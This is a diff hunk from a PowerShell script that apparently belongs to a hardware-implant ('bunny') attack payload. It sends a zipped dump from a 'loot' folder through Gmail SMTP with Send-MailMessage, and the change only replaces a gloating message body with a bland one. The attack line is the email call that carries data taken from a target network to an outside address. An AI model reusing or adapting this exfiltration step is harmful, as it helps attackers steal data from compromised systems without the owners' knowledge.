@@ -5,7 +5,7 @@ $Creds = New-Object Management.Automation.PSCredential "some@email.com", ("YOUR-
 $To = "you@your.com"
 $Attachment = "C:\temp\loot\dmp.zip"
 $Subject = "Muwahahhah!!"
-$Body = "Here's what the bunny was able to dig up in our target network!"
+$Body = "Here's a message"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 Send-MailMessage -From $From -to $To -Subject $Subject `
